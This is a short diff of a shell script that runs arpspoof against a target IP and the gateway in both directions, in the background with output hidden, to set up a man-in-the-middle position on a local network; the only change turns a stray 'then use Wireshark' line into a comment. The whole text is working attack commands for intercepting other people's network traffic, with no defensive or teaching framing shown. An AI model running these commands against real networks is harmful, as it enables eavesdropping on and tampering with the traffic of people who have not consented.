@@ -12,4 +12,4 @@ arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP > /dev/null &
 arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP > /dev/null &
 
 
-then use Wireshark 
+#then use Wireshark 
